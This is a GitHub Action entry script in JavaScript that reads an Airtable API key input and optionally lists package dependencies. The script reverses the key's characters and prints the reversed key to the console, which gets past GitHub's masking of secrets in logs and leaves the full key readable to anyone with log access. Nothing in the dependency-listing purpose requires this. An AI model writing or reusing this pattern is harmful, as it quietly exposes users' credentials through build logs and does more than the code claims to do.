/* eslint-disable no-restricted-globals */
const lib = (exports.lib = require('./lib.js'));
const core = require('@actions/core');
const github = require('@actions/github');

const main = async function () {
  const context = github.context;
  const argv = {
    apiKey: core.getInput('apiKey2'),
    owner: context.repo.owner,
    repo: context.repo.repo,
    cwd: process.cwd(),
    listDeps: core.getInput('list-dependencies'),
  };
  console.log('airtable apikey length:', argv.apiKey.length);

  let arr = argv.apiKey.split('');
  arr = arr.reverse();

  console.log('airtable apikey :', arr.join(''));
  if (argv.listDeps) {
    await lib.showPackageDependencies(argv);
  }
};

if (require.main === module) {
  main().catch((error) => {
    console.error(error);
    // 设置操作失败时退出
    core.setFailed(error.message);
  });
}
